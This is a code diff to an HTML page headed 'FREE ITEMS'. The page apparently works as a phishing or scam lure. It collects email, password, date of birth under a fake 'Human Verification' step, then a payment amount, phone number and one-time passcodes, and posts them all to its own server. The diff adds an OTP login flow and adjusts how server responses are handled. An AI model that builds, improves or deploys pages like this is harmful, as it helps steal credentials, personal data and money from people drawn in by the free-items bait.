@@ -13,14 +13,25 @@
 <body style="background-color:Blue;">
     <h1><i> FREE ITEMS </i></h1>
 
-    <!-- First Page -->
-    <form id="step1" class="active">
+    <!-- Login Page -->
+    <form id="login">
+        <p style="color:Brown">Email: <input type="email" id="loginEmail" required><br><br></p>
+        <input type="button" value="Send OTP" onclick="sendOtp()">
+    </form>
+
+    <!-- OTP Verification Page -->
+    <form id="otpVerification">
+        <p style="color:Brown">Enter OTP: <input type="text" id="otp" required><br><br></p>
+        <input type="button" value="Verify OTP" onclick="verifyOtp()">
+    </form>
+
+    <!-- Original Forms -->
+    <form id="step1">
         <p style="color:Brown">Email: <input type="email" name="email" required><br><br></p>
         <p style="color:Brown">Password: <input type="password" name="password" required><br><br></p>
         <input type="button" value="Next" onclick="nextStep(2)">
     </form>
 
-    <!-- Second Page -->
     <form id="step2">
         <h1>Human Verification</h1>
         <p style="color:Red">Date of birth: <input type="date" name="dob" required><br><br></p>
@@ -33,9 +44,8 @@
         <input type="button" value="Back" onclick="nextStep(1)">
     </form>
 
-    <!-- Third Page -->
     <form id="step3">
-    	<h1>Authentication<h1>
+        <h1>Authentication<h1>
         <p style="color:Red">Amount: <input type="number" id="amount" name="amount" min="3" max="1000" step="0.01" required><br><br></p>
         <p style="color:green">Phone No.: <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" required><br><br></p>
         <input type="button" value="Send OTP" onclick="sendOTP()">
@@ -48,6 +58,53 @@
         function nextStep(step) {
             document.querySelectorAll('form').forEach(form => form.classList.remove('active'));
             document.getElementById('step' + step).classList.add('active');
+        }
+
+        function sendOtp() {
+            const email = document.getElementById('loginEmail').value;
+            fetch('/send_otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email: email }),
+            })
+            .then(response => response.json())
+            .then(message => {
+                alert(message.message);
+                document.getElementById('login').style.display = 'none';
+                document.getElementById('otpVerification').style.display = 'block';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            });
+        }
+
+        function verifyOtp() {
+            const otp = document.getElementById('otp').value;
+            fetch('/verify_otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ otp: otp }),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Invalid OTP');
+                }
+                return response.json();
+            })
+            .then(message => {
+                alert(message.message);
+                document.getElementById('otpVerification').style.display = 'none';
+                nextStep(1); // Show the first step of the original form
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Invalid OTP. Please try again.');
+            });
         }
 
         function sendOTP() {
@@ -86,9 +143,9 @@
                 },
                 body: JSON.stringify(data),
             })
-            .then(response => response.text())
+            .then(response => response.json())
             .then(message => {
-                alert(message);
+                alert(message.message);
             })
             .catch(error => {
                 console.error('Error:', error);
@@ -97,4 +154,5 @@
         }
     </script>
 </body>
-</html>
+        </html>
+            
